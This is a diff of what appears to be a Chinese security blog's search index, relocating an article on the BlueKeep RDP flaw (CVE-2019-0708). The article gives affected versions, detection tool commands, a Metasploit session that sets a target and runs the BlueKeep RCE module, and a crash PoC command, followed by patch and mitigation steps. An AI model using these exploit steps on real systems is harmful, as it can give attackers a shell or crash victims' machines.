       </tags>
   </entry>
   <entry>
@@ -1731,49 +1731,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
-    <url>//ddf32da2222d.html</url>
-    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>Windows 7</li>
-<li>Windows server 2008 R2</li>
-<li>Windows server 2008</li>
-<li>Windows 2003</li>
-<li>Windows xp</li>
-</ul>
-<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
-<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
-
-<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
-<p>2.安装安全管家类的软件</p>
-<p>3.关闭远程桌面，开启防火墙</p>
-<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>代码执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Elasticsearch未授权访问</title>
     <url>//9db3aff65775.html</url>
     <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
@@ -1845,6 +1802,49 @@
       </categories>
       <tags>
         <tag>未授权访问</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
+    <url>//ddf32da2222d.html</url>
+    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
+<li>Windows 7</li>
+<li>Windows server 2008 R2</li>
+<li>Windows server 2008</li>
+<li>Windows 2003</li>
+<li>Windows xp</li>
+</ul>
+<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
+<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
+
+<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
+<p>2.安装安全管家类的软件</p>
+<p>3.关闭远程桌面，开启防火墙</p>
+<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
